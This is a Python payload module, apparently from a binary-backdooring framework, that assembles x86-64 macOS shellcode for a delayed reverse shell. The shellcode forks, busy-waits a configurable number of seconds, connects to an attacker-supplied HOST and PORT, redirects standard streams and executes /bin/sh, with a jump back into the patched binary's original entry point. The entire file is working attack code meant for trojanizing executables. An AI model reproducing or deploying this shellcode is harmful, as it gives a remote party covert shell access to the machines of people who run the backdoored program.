import struct
import os
import logging
from core import support
from common import common

logger = logging.getLogger(__name__)


class delay_reverse_shell_tcp():

    def __init__(self):

        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "delay_reverse_shell_tcp"
        self.description = """ delay_reverse_shell_tcp (non-stager)"""
        self.requirements = {'MODE': 'How the patching will happen',
                             'HOST': '<HOST to connect back to>',
                             'PORT': '<Port to connect back to>',
                             'DELAY': 'time in secs to delay',
                             'ENCODER': '<Encoder you want to use, else none>'
                             }
        self.supported_modes = ['remove_signature']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

    def invoke(self, PM):
        # Expose patching method objects

        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        logger.debug(dir(self.PM))
        if support.support(self).check_reqs() is False:
            return False

        return self.run()

    def run(self):
        self.shellcode2 = b"\x68\x00\x00\x00\x00"  # push 0x0
        self.shellcode2 += b"\x68\x00\x00\x00\x00"  # push 0x0
        self.shellcode2 += b"\x48\x89\xE7"  # mov add rsp, rdi <-- rdi will point to seconds
        self.shellcode2 += b"\x48\x31\xF6"  # xor rsi, rsi
        self.shellcode2 += b"\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax; syscall
        
        self.shellcode2 += b"\x48\x8B\x07" # mov rax, [rdi]
        self.shellcode2 += b"\x48\x05"

        self.shellcode2 += struct.pack("<I", int(self.DELAY))  # add rax, 15  for seconds

        self.shellcode2 += bytes("\x48\x89\xC3"                  # mov rbx, rax
                            "\xB8\x74\x00\x00\x02\x0f\x05"  # put system time in rax # SYSTEM TIME                           
                            # mov rax,[rdi]
                            "\x48\x8B\x07"
                            "\x48\x39\xD8"                  # cmp rax, rbx
                            "\x0F\x85\xed\xff\xff\xff"      # jne back to SYSTEM TIME
                            ,'iso-8859-1')

        self.shellcode2 += bytes("\xb8"
                            "\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49"
                            "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
                            "\x00\x02", 'iso-8859-1'
                            )

        self.shellcode2 += struct.pack(">H", int(self.PORT))
        self.shellcode2 += common.pack_ip_addresses(self.HOST)
        self.shellcode2 += bytes("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                            "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
                            "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02"
                            "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c"
                            "\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05",
                            'iso-8859-1'
                            )

        self.shellcode1 = b"\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2"  # FORK()
        self.shellcode1 += b"\x0f\x84"   # \x4c\x03\x00\x00"  # <-- Points to LC_MAIN/LC_UNIXTREADS offset

        if self.BDF.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.BDF.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.BDF.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2

        return self.shellcode
